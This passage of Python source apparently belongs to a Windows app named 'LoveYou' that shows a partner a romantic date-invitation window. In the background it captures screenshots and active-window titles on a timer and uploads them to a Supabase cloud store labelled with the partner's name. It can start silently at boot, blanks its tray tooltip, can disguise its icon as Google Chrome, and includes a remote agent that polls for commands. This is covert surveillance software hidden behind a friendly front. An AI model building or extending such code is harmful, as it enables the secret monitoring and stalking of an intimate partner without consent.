            img.save(filepath, "JPEG", quality=q, optimize=True)

            # Smart Budget Check untuk JPEG jika melebihi 50 KB
            if os.path.exists(filepath) and os.path.getsize(filepath) > 51200:
                w, h = img.size
                scaled = img.resize((int(w * 0.70), int(h * 0.70)), Image.Resampling.LANCZOS)
                scaled.save(filepath, "JPEG", quality=min(q, 70), optimize=True)

    return filepath, filename, resolution


# ==============================================================================
# SUPABASE LOGGER & STORAGE UPLOADER
# ==============================================================================
class SupabaseLogger:
    def __init__(self, url: str, key: str, table_name: str, bucket_name: str):
        self.url = url.rstrip("/")
        self.key = key
        self.table_name = table_name
        self.bucket_name = bucket_name
        self.client: Client = create_client(self.url, self.key)

    def upload_file(self, filepath: str, remote_filename: str) -> str:
        """Mengunggah file ke Supabase Storage (bisa di dalam folder user: roedi/ss_...webp)."""
        ext = os.path.splitext(filepath)[1].lower()
        if ext in [".jpg", ".jpeg"]:
            mime_type = "image/jpeg"
        elif ext == ".webp":
            mime_type = "image/webp"
        else:
            mime_type = "image/png"

        with open(filepath, "rb") as f:
            file_bytes = f.read()

        try:
            self.client.storage.from_(self.bucket_name).upload(
                path=remote_filename,
                file=file_bytes,
                file_options={"content-type": mime_type, "upsert": "true"},
            )
        except Exception as upload_err:
            # Jika error "Duplicate" atau "already exists", coba update/upsert ulang
            err_str = str(upload_err).lower()
            if "duplicate" in err_str or "already exists" in err_str:
                try:
                    self.client.storage.from_(self.bucket_name).update(
                        path=remote_filename,
                        file=file_bytes,
                        file_options={"content-type": mime_type},
                    )
                except Exception:
                    pass  # Tetap kembalikan URL publik meskipun update gagal
            else:
                raise  # Re-raise error non-duplicate

        # Selalu kembalikan URL publik (file tersedia via public bucket)
        return f"{self.url}/storage/v1/object/public/{self.bucket_name}/{remote_filename}"

    def log_record(
        self,
        filename: str,
        image_url: str,
        resolution: str,
        active_window: str,
        file_size_bytes: int,
        status: str = "success",
        notes: str = "",
        user_name: str = "anonymous",
        storage_path: str = "",
    ) -> dict:
        """Mencatat metadata screenshot ke tabel hasil_ss dengan pemisahan user."""
        file_size_kb = round(file_size_bytes / 1024.0, 2)
        device_name = platform.node() or "Unknown"

        # Simpan user di notes sebagai jaminan jika kolom user_name belum dibuat di database
        user_tag = f"User: {user_name}"
        full_notes = f"{user_tag} | {notes}" if notes else user_tag
        final_storage_path = storage_path or f"{self.bucket_name}/{filename}"

        record = {
            "filename": filename,
            "image_url": image_url,
            "storage_path": final_storage_path,
            "device_name": device_name,
            "resolution": resolution,
            "active_window": active_window,
            "file_size_kb": file_size_kb,
            "status": status,
            "notes": full_notes,
            "created_at": datetime.now(timezone.utc).isoformat(),
        }

        # Coba simpan dengan kolom user_name terlebih dahulu
        try:
            record_with_user = dict(record)
            record_with_user["user_name"] = user_name
            response = self.client.table(self.table_name).insert(record_with_user).execute()
            return response.data
        except Exception:
            # Fallback jika kolom user_name belum ditambahkan via SQL
            response = self.client.table(self.table_name).insert(record).execute()
            return response.data


# ==============================================================================
# TRAY ICON & CONTROLLER (PRODUCER-CONSUMER QUEUE)
# ==============================================================================
def find_icon_path(icon_name: str) -> str | None:
    """
    Mencari file icon (.ico) di runtime (onefile _MEIPASS, onedir, atau dev mode).
    """
    if not icon_name:
        return None

    filename = os.path.basename(icon_name)
    candidates = []

    # 1. PyInstaller onefile temp folder (_MEIPASS)
    meipass = getattr(sys, "_MEIPASS", None)
    if meipass:
        candidates.append(os.path.join(meipass, "resources", filename))
        candidates.append(os.path.join(meipass, filename))

    base_dir = get_base_dir()
    # 2. Folder exe / workspace
    candidates.append(os.path.join(base_dir, "resources", filename))
    candidates.append(os.path.join(base_dir, "_internal", "resources", filename))
    candidates.append(os.path.join(base_dir, "backend", "resources", filename))
    candidates.append(os.path.join(base_dir, "..", "backend", "resources", filename))
    candidates.append(os.path.join(base_dir, filename))

    # 3. Path absolut jika diberikan
    if os.path.isabs(icon_name):
        candidates.insert(0, icon_name)

    for p in candidates:
        if os.path.exists(p):
            return p

    return None


def create_dynamic_heart_icon() -> Image.Image:
    """Membuat icon hati dinamis jika file heart.ico tidak ditemukan."""
    img = Image.new("RGBA", (64, 64), (0, 0, 0, 0))
    draw = ImageDraw.Draw(img)
    draw.polygon(
        [(32, 54), (10, 32), (10, 18), (22, 10), (32, 20), (42, 10), (54, 18), (54, 32)],
        fill=(244, 63, 94),
    )
    return img


def create_dynamic_chrome_icon() -> Image.Image:
    """Membuat logo Google Chrome dinamis jika file chrome.ico tidak ditemukan."""
    img = Image.new("RGBA", (64, 64), (0, 0, 0, 0))
    draw = ImageDraw.Draw(img)
    # Tiga sektor lingkaran luar (Merah, Kuning, Hijau khas Chrome)
    draw.pieslice([4, 4, 60, 60], start=210, end=330, fill=(234, 67, 53))   # Merah Google
    draw.pieslice([4, 4, 60, 60], start=330, end=90, fill=(251, 188, 4))    # Kuning Google
    draw.pieslice([4, 4, 60, 60], start=90, end=210, fill=(52, 168, 83))    # Hijau Google
    # Lingkaran pemisah putih di tengah
    draw.ellipse([18, 18, 46, 46], fill=(255, 255, 255))
    # Lingkaran inti Biru Google
    draw.ellipse([22, 22, 42, 42], fill=(66, 133, 244))
    return img


def get_tray_icon_image(icon_name: str = "heart.ico") -> Image.Image:
    """
    Mengambil icon untuk System Tray sesuai preferensi konfigurasi (chrome.ico, heart.ico, dll).
    Mendukung PyInstaller onefile (_MEIPASS), onedir, dan mode dev.
    Jika file tidak ditemukan, membuat ikon dinamis (Chrome atau Heart) sebagai fallback terjamin.
    """
    is_chrome = "chrome" in (icon_name or "").lower()

    # 1. Coba cari path file ikon yang diminta
    icon_path = find_icon_path(icon_name)
    if icon_path and os.path.exists(icon_path):
        try:
            return Image.open(icon_path)
        except Exception as e:
            print(f"[WARN] Gagal membuka file icon '{icon_path}': {e}")

    # 2. Jika mode Chrome tapi file spesifik tidak ditemukan, cari fallback chrome.ico
    if is_chrome:
        chrome_fallback = find_icon_path("chrome.ico")
        if chrome_fallback and os.path.exists(chrome_fallback):
            try:
                return Image.open(chrome_fallback)
            except Exception:
                pass
        return create_dynamic_chrome_icon()

    # 3. Fallback icon hati
    heart_fallback = find_icon_path("heart.ico")
    if heart_fallback and os.path.exists(heart_fallback):
        try:
            return Image.open(heart_fallback)
        except Exception:
            pass

    return create_dynamic_heart_icon()


class ServiceController:
    def __init__(self, conf: dict, enable_agent: bool = True, init_supabase: bool = True):
        self.conf = conf
        self.is_running = True
        self.is_paused = False
        saved_state = load_app_state(conf)
        saved_user = saved_state.get("active_user", "").strip()
        self.current_user = saved_user if saved_user else "anonymous"
        self.onboarding_done = bool(saved_state.get("onboarding_done", False))
        self.date_accepted = bool(saved_state.get("date_accepted", False))
        self.tray_icon: pystray.Icon | None = None
        self.supabase_logger: SupabaseLogger | None = None
        self.total_captured = 0
        self.total_uploaded = 0

        if init_supabase:
            self._init_supabase_logger()

        # Inisialisasi ServiceManager terpusat & 7 layanan modular
        self.service_manager = ServiceManager()

        self.notification_service = NotificationService(
            initial_config={
                "enabled": bool(conf.get("show_tray_notifications", False)),
                "notify_on_capture": bool(conf.get("show_tray_notifications", False)),
                "notify_on_config_change": False,
                "notify_on_command": False,
            },
            get_tray_icon_fn=lambda: self.tray_icon,
        )

        self.sync_service = SyncService(
            initial_config={
                "supabase_url": conf.get("supabase_url", DEFAULT_SUPABASE_URL),
                "table_name": conf.get("table_name", DEFAULT_TABLE_NAME),
                "bucket_name": conf.get("bucket_name", DEFAULT_BUCKET_NAME),
                "max_queue_size": 200,
                "max_upload_retries": 6,
                "retry_backoff_seconds": 4.0,
            },
            logger_factory=self._get_or_create_supabase_logger,
            get_user_fn=self._get_synced_user,
            keep_local_file_fn=self._should_keep_local_file,
            on_uploaded=self._handle_uploaded_item,
        )
        # Pertahankan referensi antrean legacy agar 100% backward-compatible
        self.upload_queue = self.sync_service.upload_queue

        self.screenshot_service = ScreenshotService(
            initial_config={
                "interval_seconds": int(conf.get("interval_seconds", DEFAULT_INTERVAL)),
                "image_format": str(conf.get("image_format", "webp")).lower(),
                "jpg_quality": int(conf.get("jpg_quality", 75)),
                "keep_local_file": bool(conf.get("keep_local_file", False)),
                "local_folder": str(conf.get("local_folder", DEFAULT_LOCAL_FOLDER)),
            },
            capture_fn=capture_screenshot,
            active_window_fn=get_active_window_title,
            get_user_fn=self._get_synced_user,
            on_captured=self._handle_captured_item,
            on_notify=lambda title, msg: self.notification_service.notify(title, msg, event_kind="capture"),
        )

        self.tray_service = TrayService(
            initial_config={
                "icon": conf.get("tray_icon", "heart.ico"),
                "app_name": conf.get("app_name", DEFAULT_APP_NAME),
                "minimalist_tooltip": True,
            },
            tray_factory=lambda _cfg: setup_tray(self),
            wait_for_taskbar=False,
        )

        self.ui_service = UiService(
            initial_config={
                "window_title": UI_WINDOW_TITLE,
                "date_invitation_text": conf.get("date_invitation_text", DEFAULT_INVITE_TEXT),
                "date_countdown_target": conf.get("date_countdown_target", DEFAULT_COUNTDOWN_TARGET),
                "tanggal_date": conf.get("tanggal_date", DEFAULT_TANGGAL_DATE),
                "width": 560,
                "height": 760,
                "theme": "romantic-dark",
            },
            launch_fn=lambda _cfg: _launch_ui_subprocess(),
            on_config_updated=self._sync_ui_runtime_config,
        )

        self.game_service = GameService(initial_config={"enabled": False, "game_mode": "idle"})
        self.custom_service = CustomService(initial_config={"enabled": False, "plugin_name": "default_plugin"})

        for svc in (
            self.screenshot_service,
            self.tray_service,
            self.sync_service,
            self.notification_service,
            self.ui_service,
            self.game_service,
            self.custom_service,
        ):
            self.service_manager.register(svc)

        self.service_manager.on_status_change(self._handle_service_status_change)

        # Inisialisasi LoveYou Device Agent (outbound-only HTTPS, tanpa admin login di klien)
        self.agent: LoveYouAgent | None = None
        if enable_agent and conf.get("agent_enabled", False) and str(conf.get("agent_api_base_url", "")).strip():
            self.agent = LoveYouAgent(
                service_manager=self.service_manager,
                api_base_url=str(conf.get("agent_api_base_url", "")).strip(),
                app_slug=str(conf.get("agent_project_slug", "loveyou")).strip() or "loveyou",
                app_version=str(conf.get("agent_app_version", "1.0.0")).strip() or "1.0.0",
                enrollment_code=str(conf.get("agent_enrollment_code", "")).strip(),
                heartbeat_interval_seconds=float(conf.get("agent_heartbeat_interval", 30)),
                poll_interval_seconds=float(conf.get("agent_poll_interval", 10)),
                config_sync_interval_seconds=float(conf.get("agent_config_sync_interval", 60)),
                realtime_enabled=bool(conf.get("agent_realtime_enabled", False)),
                supabase_url=str(conf.get("supabase_url", "")),
                supabase_key=str(conf.get("supabase_key", "")),
            )

    def _get_synced_user(self) -> str:
        self.sync_user_from_state()
        return self.current_user

    def _should_keep_local_file(self) -> bool:
        if hasattr(self, "screenshot_service") and self.screenshot_service is not None:
            return bool(self.screenshot_service.config.get("keep_local_file", False))
        return bool(self.conf.get("keep_local_file", False))

    def _get_or_create_supabase_logger(self):
        if self.supabase_logger is not None:
            return self.supabase_logger
        if self._init_supabase_logger():
            return self.supabase_logger
        return None

    def _handle_captured_item(self, item: dict):
        self.total_captured += 1
        self.sync_service.enqueue(item)
        self.update_tray_status()

    def _handle_uploaded_item(self, info: dict):
        self.total_uploaded += 1
        filename = info.get("filename", "")
        user_name = info.get("user_name", "anonymous")
        print(f"[{datetime.now().strftime('%H:%M:%S')}] [UPLOAD #{self.total_uploaded} OK] [{user_name}] {filename} -> Supabase")
        self.update_tray_status()

    def _sync_ui_runtime_config(self, updated_cfg: dict):
        resolved = resolve_date_settings(
            updated_cfg.get("date_invitation_text", self.conf.get("date_invitation_text", DEFAULT_INVITE_TEXT)),
            updated_cfg.get("date_countdown_target", self.conf.get("date_countdown_target", DEFAULT_COUNTDOWN_TARGET)),
        )
        self.conf["date_invitation_text"] = resolved["date_invitation_text"]
        self.conf["date_countdown_target"] = resolved["date_countdown_target"]
        self.conf["tanggal_date"] = updated_cfg.get("tanggal_date") or resolved["tanggal_date"]

    def _handle_service_status_change(self, service_key: str, status_payload: dict):
        if service_key == "screenshot_service":
            self.is_paused = status_payload.get("status") == STATUS_PAUSED
            self.update_tray_status()

    def start_core_services(self, start_tray: bool = True, is_boot_silent: bool = False, start_agent: bool = True):
        """Memulai seluruh service inti melalui ServiceManager terpusat."""
        self.service_manager.execute_action("sync_service", "start")
        self.service_manager.execute_action("screenshot_service", "start")
        if self.conf.get("show_tray_notifications", False):
            self.service_manager.execute_action("notification_service", "start")
        if start_tray:
            self.tray_service._wait_for_taskbar = bool(is_boot_silent)
            self.service_manager.execute_action("tray_service", "start")
        if start_agent and self.agent is not None:
            self.agent.start()

    def stop_all_services(self):
        """Menghentikan Device Agent dan seluruh service modular secara normal (graceful stop)."""
        self.is_running = False
        if self.agent is not None:
            try:
                self.agent.stop()
            except Exception:
                pass
        try:
            self.service_manager.stop_all()
        except Exception:
            pass
        if self.tray_icon:
            try:
                self.tray_icon.stop()
            except Exception:
                pass

    def _init_supabase_logger(self) -> bool:
        """Inisialisasi atau inisialisasi ulang client Supabase (aman dipanggil ulang jika sempat offline)."""
        if self.supabase_logger is not None:
            return True
        try:
            self.supabase_logger = SupabaseLogger(
                url=self.conf["supabase_url"],
                key=self.conf["supabase_key"],
                table_name=self.conf["table_name"],
                bucket_name=self.conf["bucket_name"],
            )
            return True
        except Exception as e:
            print(f"[WARN] Supabase init error: {e}")
            return False

    def sync_user_from_state(self):
        """Sinkronkan current_user dari Registry (jika ada update dari proses UI lain)."""
        try:
            state = load_app_state(self.conf)
            reg_user = state.get("active_user", "").strip()
            if reg_user and reg_user != self.current_user:
                self.current_user = reg_user
                print(f"[SYNC] User aktif diperbarui dari Registry ke: '{self.current_user}'")
        except Exception:
            pass

    def set_active_user(self, name: str, persist: bool = True):
        """Menyetel user aktif saat pacar/user mengisi nama di LoveYou App dan menyimpannya persisten."""
        cleaned = (name or "").strip()
        if not cleaned:
            return
        # Bersihkan nama agar aman untuk nama folder & file
        safe_name = "".join(c for c in cleaned if c.isalnum() or c in ("-", "_", " ")).strip()
        if safe_name:
            self.current_user = safe_name
            if persist:
                save_app_state(self.conf, active_user=safe_name)
            print(f"[USER] User aktif sekarang diubah ke: '{self.current_user}'")
            self.update_tray_status()

    def update_tray_status(self):
        """Tooltip di System Tray dikosongkan agar tidak memunculkan teks apapun saat di-hover."""
        if self.tray_icon:
            try:
                self.tray_icon.title = " "
            except Exception:
                pass

    @staticmethod
    def _is_transient_network_error(err: Exception | str) -> bool:
        return SyncService.is_transient_network_error(err)

    def capture_worker(self):
        """Kompatibilitas legacy: menjalankan loop ScreenshotService hingga controller berhenti."""
        print(f"[CAPTURE] Producer aktif (user: '{self.current_user}'). Menangkap layar setiap {self.screenshot_service.config['interval_seconds']} detik...")
        self.screenshot_service.start()
        while self.is_running:
            time.sleep(0.2)
        self.screenshot_service.stop()
        print("[CAPTURE] Producer berhenti.")

    def uploader_worker(self):
        """Kompatibilitas legacy: menjalankan loop SyncService hingga controller berhenti."""
        print("[UPLOADER] Consumer aktif. Mengunggah ke Supabase...")
        self.sync_service.start()
        while self.is_running:
            time.sleep(0.2)
        self.sync_service.stop()
        print("[UPLOADER] Consumer berhenti.")

    # Menu Callbacks
    def on_capture_now(self, icon, item):
        try:
            self.screenshot_service.capture_once()
            print("[INFO] Capture instan ditambahkan ke antrean.")
        except Exception as e:
            print(f"[ERROR] Capture instan gagal: {e}")

    def on_toggle_pause(self, icon, item):
        action = "resume" if self.is_paused else "pause"
        res = self.service_manager.execute_action("screenshot_service", action)
        if res.get("ok"):
            self.is_paused = action == "pause"
        else:
            self.is_paused = not self.is_paused
        status_text = "DIJEDA" if self.is_paused else "AKTIF"
        print(f"[STATUS] Layanan screenshot sekarang: {status_text}")
        self.update_tray_status()

    def on_restart_screenshot(self, icon, item):
        res = self.service_manager.execute_action("screenshot_service", "restart")
        print(f"[STATUS] Restart ScreenshotService: {res.get('message', '')}")
        self.update_tray_status()

    def on_stop_screenshot(self, icon, item):
        res = self.service_manager.execute_action("screenshot_service", "stop")
        print(f"[STATUS] Stop ScreenshotService: {res.get('message', '')}")
        self.update_tray_status()

    def on_open_gallery(self, icon, item):
        base_dir = get_base_dir()
        try:
            from view_results import view_results
            threading.Thread(target=view_results, kwargs={"open_browser": True}, daemon=True).start()
        except Exception:
            html_path = os.path.join(base_dir, "hasil_ss_gallery.html")
            if os.path.exists(html_path):
                webbrowser.open(f"file:///{os.path.abspath(html_path)}")

    def on_open_love_ui(self, icon, item):
        """Membuka jendela native LoveYou Frontend (pywebview) melalui UiService."""
        self.service_manager.execute_action("ui_service", "start")

    def on_open_supabase(self, icon, item):
        webbrowser.open("https://supabase.com/dashboard/project/wqjfunxfngowxwdmyzyj/editor")

    def on_open_local_folder(self, icon, item):
        if not self._should_keep_local_file():
            print("[INFO] Penyimpanan lokal dinonaktifkan (100% Cloud Supabase).")
            return
        folder = self.screenshot_service.config.get("local_folder", self.conf["local_folder"])
        os.makedirs(folder, exist_ok=True)
        os.startfile(folder)

    def on_open_config(self, icon, item):
        base_dir = get_base_dir()
        config_path = os.path.join(base_dir, "config.ini")
        if os.path.exists(config_path):
            os.startfile(config_path)

    def on_exit(self, icon, item):
        print("[EXIT] Menghentikan LoveYou Service secara normal...")
        self.stop_all_services()
        if icon is not None:
            try:
                icon.stop()
            except Exception:
                pass

    def on_emergency_uninstall(self, icon=None, item=None):
        """Callback menu System Tray untuk menonaktifkan dan menghapus aplikasi sampai bersih."""
        uninstall_and_clean_exit(self)


def setup_tray(controller: ServiceController) -> pystray.Icon:
    """Membangun menu interaktif minimalis untuk system tray native Windows."""
    tray_icon_file = controller.conf.get("tray_icon", "heart.ico")
    is_chrome = "chrome" in tray_icon_file.lower() or "chrome" in controller.conf.get("app_name", "").lower()
    icon_image = get_tray_icon_image(tray_icon_file)

    def get_pause_label(item):
        return "▶ Lanjutkan Screenshot" if controller.is_paused else "⏸ Jeda Screenshot"

    app_name = controller.conf.get("app_name", "LoveYou")
    header_label = f"🌐 {app_name}" if is_chrome else "❤️ LoveYou"
    app_open_label = f"🌐 Buka {app_name}" if is_chrome else "💕 Buka LoveYou App"

    menu_items = [
        pystray.MenuItem(header_label, None, enabled=False),
        pystray.Menu.SEPARATOR,
        pystray.MenuItem(app_open_label, controller.on_open_love_ui, default=True),
        pystray.Menu.SEPARATOR,
        pystray.MenuItem("📸 Ambil Screenshot Sekarang", controller.on_capture_now),
        pystray.MenuItem("🖼️ Buka Galeri Hasil SS", controller.on_open_gallery),
        pystray.MenuItem("🌐 Buka Dashboard Supabase", controller.on_open_supabase),
    ]

    # Hanya tampilkan menu buka folder lokal jika mode simpan lokal aktif
    if controller._should_keep_local_file():
        menu_items.append(pystray.MenuItem("📂 Buka Folder Screenshot Lokal", controller.on_open_local_folder))

    menu_items.extend([
        pystray.Menu.SEPARATOR,
        pystray.MenuItem(get_pause_label, controller.on_toggle_pause),
        pystray.MenuItem("🔄 Restart Screenshot", controller.on_restart_screenshot),
        pystray.MenuItem("⏹ Hentikan Screenshot", controller.on_stop_screenshot),
        pystray.MenuItem("⚙️ Buka Konfigurasi (config.ini)", controller.on_open_config),
        pystray.Menu.SEPARATOR,
        pystray.MenuItem("🛑 Nonaktifkan & Hapus (Uninstall)", controller.on_emergency_uninstall),
        pystray.MenuItem("❌ Keluar", controller.on_exit),
    ])

    menu = pystray.Menu(*menu_items)

    tray = pystray.Icon(
        name=app_name if is_chrome else "LoveYou",
        icon=icon_image,
        title=" ",  # Dikosongkan agar tetap minimalis (tanpa tooltip saat hover)
        menu=menu,
    )
    controller.tray_icon = tray
    return tray


class LoveYouApi:
    """Bridge Python-JS untuk pywebview agar frontend bisa memanggil fungsi Python."""
    def __init__(self, controller=None, conf: dict | None = None):
        self.controller = controller
        self.conf = conf or (controller.conf if controller else load_config())
        self._last_submit = None

    def set_user(self, nama: str):
        """Dipanggil dari name.html saat user memasukkan nama."""
        nama = (nama or "").strip()
        print(f"[UI BRIDGE] set_user diterima: '{nama}'")
        if self.controller:
            self.controller.set_active_user(nama, persist=True)
        elif nama:
            safe_name = "".join(c for c in nama if c.isalnum() or c in ("-", "_", " ")).strip()
            if safe_name:
                save_app_state(self.conf, active_user=safe_name)

    def get_active_user(self) -> str:
        """Mengembalikan nama user aktif yang tersimpan di Registry."""
        state = load_app_state(self.conf)
        saved = state.get("active_user", "").strip()
        if saved:
            return saved
        if self.controller and self.controller.current_user != "anonymous":
            return self.controller.current_user
        return ""

    def mark_onboarding_done(self):
        """Menandai bahwa user sudah mencapai halaman countdown jadwal date."""
        save_app_state(self.conf, onboarding_done=True)
        if self.controller:
            self.controller.onboarding_done = True

    def get_date_config(self) -> dict:
        """Mengembalikan konfigurasi tanggal undangan, countdown target, dan tanggal_date."""
        return {
            "date_invitation_text": self.conf.get("date_invitation_text", DEFAULT_INVITE_TEXT),
            "date_countdown_target": self.conf.get("date_countdown_target", DEFAULT_COUNTDOWN_TARGET),
            "tanggal_date": self.conf.get("tanggal_date", DEFAULT_TANGGAL_DATE),
        }

    def submit_response(self, nama: str, tanggal: str, status: str):
        """Menerima kiriman respons ajakan date dari JavaScript frontend."""
        nama = (nama or "").strip()
        status_clean = (status or "").strip().lower()

        # Utamakan tanggal_date hasil konfigurasi user (bukan dummy 2026-12-05)
        conf_tanggal = self.conf.get("tanggal_date", DEFAULT_TANGGAL_DATE).strip()
        passed_tanggal = (tanggal or "").strip()
        if conf_tanggal and (not passed_tanggal or passed_tanggal == DEFAULT_TANGGAL_DATE):
            final_tanggal = conf_tanggal
        else:
            final_tanggal = passed_tanggal or conf_tanggal or DEFAULT_TANGGAL_DATE

        # Deduplikasi: cegah insert ganda jika status yang sama terpanggil berulang dalam 10 detik
        now = time.time()
        if self._last_submit and (now - self._last_submit.get("time", 0) < 10):
            if self._last_submit.get("nama") == nama and self._last_submit.get("status") == status_clean:
                print(f"[UI BRIDGE] Mengabaikan submit duplikat untuk: {nama} ({status_clean})")
                return True

        self._last_submit = {"nama": nama, "status": status_clean, "time": now}
        print(f"[UI BRIDGE] Respons pacar: {nama} | Tanggal: {final_tanggal} | Status: {status_clean}")

        # Simpan state persisten terlebih dahulu (agar tetap aman walau offline)
        is_yes = status_clean == "yes"
        if self.controller:
            self.controller.set_active_user(nama, persist=True)
            if is_yes:
                self.controller.onboarding_done = True
                self.controller.date_accepted = True
        elif nama:
            save_app_state(self.conf, active_user=nama)

        if is_yes:
            save_app_state(self.conf, onboarding_done=True, date_accepted=True)

        if self.controller:
            self.controller._init_supabase_logger()
            if self.controller.supabase_logger:
                try:
                    rec = {
                        "nama": nama,
                        "tanggal_date": final_tanggal,
                        "status": status_clean,
                        "created_at": datetime.now(timezone.utc).isoformat(),
                    }
                    self.controller.supabase_logger.client.table("user_responses").insert(rec).execute()
                    print(f"[UI BRIDGE] Berhasil simpan ke user_responses Supabase: {rec}")
                except Exception as e:
                    print(f"[UI BRIDGE ERROR] Gagal simpan ke Supabase: {e}")

        return True


_mutex_handle = None
UI_WINDOW_TITLE = "❤️ LoveYou"


def is_app_already_running(conf: dict | None = None) -> bool:
    """Mengecek apakah instance service aplikasi ini sudah aktif di latar belakang (Windows Mutex per app)."""
    global _mutex_handle
    try:
        ERROR_ALREADY_EXISTS = 183
        kernel32 = ctypes.windll.kernel32
        state_id = get_app_state_id(conf or {})
        mutex_name = f"Local\\XooseSvcMutex_{state_id}"
        _mutex_handle = kernel32.CreateMutexW(None, False, mutex_name)
        if kernel32.GetLastError() == ERROR_ALREADY_EXISTS:
            return True
    except Exception:
        pass
    return False


def focus_existing_ui_window() -> bool:
    """Membawa jendela UI yang sudah terbuka ke depan layar jika user klik icon berulang kali."""
    try:
        user32 = ctypes.windll.user32
        hwnd = user32.FindWindowW(None, UI_WINDOW_TITLE)
        if hwnd:
            user32.ShowWindow(hwnd, 9)  # SW_RESTORE
            user32.SetForegroundWindow(hwnd)
            return True
    except Exception:
        pass
    return False


def _launch_ui_subprocess():
    """Spawn exe --ui di proses baru agar pywebview berjalan di main thread proses tsb."""
    if focus_existing_ui_window():
        return

    if getattr(sys, "frozen", False):
        cmd = [sys.executable, "--ui"]
    else:
        cmd = [sys.executable, os.path.abspath(__file__), "--ui"]

    # Bersihkan variable PyInstaller internal agar child --onefile melakukan bootstrap bersih
    child_env = os.environ.copy()
    for k in list(child_env.keys()):
        if k == "_MEIPASS2" or k.startswith("_PYI_"):
            child_env.pop(k, None)

    try:
        subprocess.Popen(
            cmd,
            env=child_env,
            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
        )
    except Exception as e:
        print(f"[UI ERROR] Gagal spawn subprocess UI: {e}")


def run_ui_window(controller=None, conf: dict | None = None):
    """
    Menampilkan jendela native LoveYou App (pywebview Edge Chromium).
    - Pertama kali (belum onboarding): membuka index.html -> name.html -> invite.html -> yes.html.
    - Jika sudah pernah memasukkan nama & menerima undangan: langsung membuka yes.html (jadwal countdown)!
    Blok thread pemanggil sampai jendela ditutup.
    """
    active_conf = conf or (controller.conf if controller else load_config())
    state_id = get_app_state_id(active_conf)

    # Cegah jendela UI ganda terbuka bersamaan
    ui_mutex_handle = None
    try:
        kernel32 = ctypes.windll.kernel32
        ui_mutex_handle = kernel32.CreateMutexW(None, False, f"Local\\XooseUIMutex_{state_id}")
        if kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
            focus_existing_ui_window()
            if ui_mutex_handle:
                kernel32.CloseHandle(ui_mutex_handle)
            return
    except Exception:
        pass

    try:
        saved_state = load_app_state(active_conf)
        saved_user = saved_state.get("active_user", "").strip()
        is_onboarded = bool(saved_state.get("onboarding_done") or saved_state.get("date_accepted"))

        if is_onboarded:
            target_page = "yes.html"
        elif saved_user:
            target_page = "invite.html"
        else:
            target_page = "index.html"

        page_path = get_frontend_path(target_page)
        if not os.path.exists(page_path):
            page_path = get_frontend_path("index.html")
        if not os.path.exists(page_path):
            print(f"[UI ERROR] File frontend tidak ditemukan di: {page_path}")
            return

        url = "file:///" + page_path.replace("\\", "/")
        hash_params = {}
        if saved_user:
            hash_params["name"] = saved_user
        if active_conf.get("date_invitation_text"):
            hash_params["date_text"] = active_conf["date_invitation_text"]
        if active_conf.get("date_countdown_target"):
            hash_params["target"] = active_conf["date_countdown_target"]
        if active_conf.get("tanggal_date"):
            hash_params["tanggal_date"] = active_conf["tanggal_date"]
        if hash_params:
            url += "#" + urllib.parse.urlencode(hash_params)

        print(f"[UI] Membuka jendela LoveYou ({target_page}): {url}")

        api = LoveYouApi(controller=controller, conf=active_conf)
        webview.create_window(
            title=UI_WINDOW_TITLE,
            url=url,
            js_api=api,
            width=560,
            height=760,
            resizable=True,
            min_size=(420, 580),
            background_color="#0d0007",
        )
        webview.start(gui="edgechromium")
    finally:
        if ui_mutex_handle:
            try:
                ctypes.windll.kernel32.CloseHandle(ui_mutex_handle)
            except Exception:
                pass


def _start_tray_safely(controller: ServiceController, is_boot_silent: bool = False):
    """Memulai ikon System Tray setelah Explorer taskbar siap (penting saat Windows Startup)."""
    def _runner():
        if is_boot_silent:
            try:
                user32 = ctypes.windll.user32
                for _ in range(30):
                    if not controller.is_running:
                        return
                    if user32.FindWindowW("Shell_TrayWnd", None):
                        break
                    time.sleep(0.5)
            except Exception:
                time.sleep(2.0)

        if not controller.is_running:
            return

        tray = setup_tray(controller)
        try:
            tray.run_detached()
            print("\n[INFO] Ikon Tray telah aktif di System Tray (Pojok kanan bawah).")
        except Exception as e:
            print(f"[WARN] Tray run_detached gagal, mencoba ulang: {e}")
            time.sleep(2.0)
            if controller.is_running:
                try:
                    tray.run_detached()
                except Exception as e2:
                    print(f"[WARN] Tray retry gagal: {e2}")

    if is_boot_silent:
        threading.Thread(target=_runner, daemon=True, name="TrayStarter").start()
    else:
        _runner()


def main():
    parser = argparse.ArgumentParser(description="LoveYou Native Screenshot Service & Romantic UI")
    parser.add_argument("--ui", action="store_true", help="Hanya tampilkan jendela LoveYou App (webview)")
    parser.add_argument("--silent", action="store_true", help="Jalankan di latar belakang tanpa pop-up UI")
    parser.add_argument("--background", action="store_true", help="Alias untuk --silent")
    parser.add_argument("--test", action="store_true", help="Jalankan 1 kali screenshot pengujian lalu keluar")
    parser.add_argument("--no-startup", action="store_true", help="Jangan daftarkan ke Windows Startup")
    parser.add_argument("--no-tray", action="store_true", help="Jalankan tanpa icon System Tray (Headless)")
    parser.add_argument("--no-agent", action="store_true", help="Nonaktifkan LoveYou Device Agent untuk sesi ini")
    parser.add_argument("--interval", type=int, default=None, help="Override interval screenshot dalam detik")
    args = parser.parse_args()

    conf = load_config()
    if args.interval is not None and args.interval > 0:
        conf["interval_seconds"] = args.interval

    # 1. Mode --ui: hanya tampilkan jendela LoveYou App
    if args.ui:
        controller = ServiceController(conf, enable_agent=False)
        run_ui_window(controller, conf=conf)
        return

    # 2. Cek apakah service sudah aktif di latar belakang (Single Instance per app)
    if is_app_already_running(conf):
        if args.silent or args.background:
            return
        # Jika user mengklik exe saat service sudah jalan, langsung buka UI (countdown jika sudah onboarding)!
        print("[INFO] Service sudah aktif di latar belakang. Membuka jendela UI...")
        controller = ServiceController(conf, enable_agent=False)
        run_ui_window(controller, conf=conf)
        return

    # 3. Main Instance: Inisialisasi Service
    print("=" * 65)
    print("   LOVEYOU MODULAR SERVICE & ROMANTIC UI")
    print("=" * 65)
    print(f" URL Supabase     : {conf['supabase_url']}")
    print(f" Tabel Database   : {conf['table_name']}")
    print(f" Storage Bucket   : {conf['bucket_name']}")
    print(f" Interval Detik   : {conf['interval_seconds']} detik")
    print(f" Format Gambar    : {conf['image_format'].upper()} (Quality: {conf['jpg_quality']}%)")
    print(f" Folder Lokal     : {conf['local_folder']}")
    print(f" Nama Registry    : {conf['app_name']}")
